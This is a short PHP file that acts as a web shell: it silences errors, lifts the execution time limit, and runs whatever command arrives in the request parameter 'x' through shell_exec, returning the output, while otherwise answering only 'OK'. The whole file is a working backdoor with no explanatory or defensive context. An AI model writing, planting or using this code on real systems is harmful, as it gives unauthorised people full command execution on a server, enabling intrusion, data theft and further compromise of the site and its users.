<?php
error_reporting(0);
@set_time_limit(0);
if (isset($_REQUEST['x'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo shell_exec($_REQUEST['x'] . ' 2>&1');
    exit;
}
echo "OK";
